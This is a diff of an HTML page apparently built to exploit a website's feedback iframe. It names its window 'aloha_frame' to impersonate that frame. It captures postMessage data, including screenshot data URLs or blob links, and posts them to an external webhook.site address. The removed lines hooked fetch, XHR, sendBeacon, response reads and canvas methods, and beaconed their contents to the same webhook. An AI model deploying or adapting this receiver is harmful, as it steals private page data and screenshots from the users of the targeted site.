@@ -1,137 +1,36 @@
 <!DOCTYPE html>
 <html>
-  <body style="background:red;color:white">
-    <h2>Deep Hooked Receiver Active</h2>
+  <body>
+    <h2>receiver.html loaded</h2>
     <script>
-      window.name = "aloha_frame";
-      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322";
+      window.name = "aloha_frame"; // Critical: impersonate the real feedback iframe
 
-      const log = (...args) => console.log("📡", ...args);
-      const sendPayload = (label, data) => {
-        navigator.sendBeacon(webhookURL, JSON.stringify({
-          label,
-          timestamp: new Date().toISOString(),
-          preview: typeof data === "string" ? data.slice(0, 150) : String(data),
-        }));
-      };
+      const webhookURL = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322"; // Replace with yours
 
-      // 🔥 MIME detection
-      function sniffMime(buffer) {
-        const sig = new Uint8Array(buffer.slice(0, 8)).join(",");
-        const mimeMap = {
-          "137,80,78,71,13,10,26,10": "image/png",
-          "255,216,255": "image/jpeg",
-          "82,73,70,70": "webp",
-        };
-        for (const sigBytes in mimeMap) {
-          if (sig.startsWith(sigBytes)) return mimeMap[sigBytes];
-        }
-        return "unknown";
+      function deepFindScreenshot(obj) {
+        const str = JSON.stringify(obj);
+        const base64 = str.match(/data:image\/png;base64,[A-Za-z0-9+/=]+/);
+        const blob = str.match(/blob:https:\/\/[a-z0-9.-]+\/[a-z0-9\-]+/i);
+        return base64 ? base64[0] : (blob ? blob[0] : null);
       }
 
-      // 🧲 fetch hook
-      const _fetch = window.fetch;
-      window.fetch = async (...args) => {
-        const [url, opts] = args;
-        const cloned = opts?.body;
-        if (cloned instanceof Blob) {
-          const ab = await cloned.arrayBuffer();
-          const mime = sniffMime(ab);
-          log("fetch → Blob upload", url, mime);
-          sendPayload("fetch_blob", mime);
-        }
-        return _fetch(...args);
-      };
-
-      // 🧲 sendBeacon hook
-      const _sb = navigator.sendBeacon;
-      navigator.sendBeacon = (url, data) => {
-        if (data instanceof Blob || data instanceof ArrayBuffer) {
-          const mime = sniffMime(data);
-          log("sendBeacon → Binary", url, mime);
-          sendPayload("beacon_binary", mime);
-        }
-        return _sb(url, data);
-      };
-
-      // 🧲 XHR send
-      const _xhr = XMLHttpRequest.prototype.send;
-      XMLHttpRequest.prototype.send = function(data) {
-        if (data instanceof ArrayBuffer || data instanceof Blob) {
-          sniffMime(data).then(mime => {
-            log("XHR → Binary send", mime);
-            sendPayload("xhr_binary", mime);
-          });
-        }
-        _xhr.call(this, data);
-      };
-
-      // 🧲 arrayBuffer + text hooks
-      const _ab = Response.prototype.arrayBuffer;
-      Response.prototype.arrayBuffer = function() {
-        return _ab.call(this).then(buf => {
-          log("arrayBuffer() accessed:", sniffMime(buf));
-          sendPayload("response_arrayBuffer", sniffMime(buf));
-          return buf;
-        });
-      };
-
-      const _txt = Response.prototype.text;
-      Response.prototype.text = function() {
-        return _txt.call(this).then(txt => {
-          log("text() accessed:", txt.slice(0, 50));
-          sendPayload("response_text", txt.slice(0, 150));
-          return txt;
-        });
-      };
-
-      // 🧲 canvas methods
-      const _ctx = HTMLCanvasElement.prototype.getContext;
-      HTMLCanvasElement.prototype.getContext = function(type, ...rest) {
-        log("canvas.getContext", type);
-        sendPayload("canvas_getContext", type);
-        return _ctx.call(this, type, ...rest);
-      };
-
-      const _toBlob = HTMLCanvasElement.prototype.toBlob;
-      HTMLCanvasElement.prototype.toBlob = function(cb, ...rest) {
-        log("canvas.toBlob()");
-        const wrapped = (...args) => {
-          sendPayload("canvas_blob", "triggered");
-          cb(...args);
-        };
-        return _toBlob.call(this, wrapped, ...rest);
-      };
-
-      const _toDataURL = HTMLCanvasElement.prototype.toDataURL;
-      HTMLCanvasElement.prototype.toDataURL = function(...rest) {
-        const res = _toDataURL.call(this, ...rest);
-        log("canvas.toDataURL()", res.slice(0, 100));
-        sendPayload("canvas_dataURL", res.slice(0, 150));
-        return res;
-      };
-
-      const _getImageData = CanvasRenderingContext2D.prototype.getImageData;
-      CanvasRenderingContext2D.prototype.getImageData = function(...rest) {
-        log("canvas.getImageData() called");
-        sendPayload("canvas_getImageData", "called");
-        return _getImageData.call(this, ...rest);
-      };
-
-      const _createImageBitmap = window.createImageBitmap;
-      window.createImageBitmap = function(...args) {
-        log("createImageBitmap() triggered");
-        sendPayload("createImageBitmap", "called");
-        return _createImageBitmap(...args);
-      };
-
-      // 🧲 message listener
       window.addEventListener("message", (e) => {
-        log("postMessage received:", e.data);
-        sendPayload("postMessage_data", JSON.stringify(e.data).slice(0, 200));
+        console.log("📩 postMessage from:", e.origin);
+        console.log("🧾 Raw data:", e.data);
+
+        fetch(webhookURL, {
+          method: "POST",
+          mode: "no-cors",
+          body: JSON.stringify({
+            origin: e.origin,
+            data: e.data,
+            containsScreenshot: !!deepFindScreenshot(e.data),
+            timestamp: new Date().toISOString()
+          })
+        });
       });
 
-      log("✅ Deep receiver loaded and impersonating aloha_frame");
+      console.log("✅ receiver.html active and impersonating aloha_frame");
     </script>
   </body>
 </html>
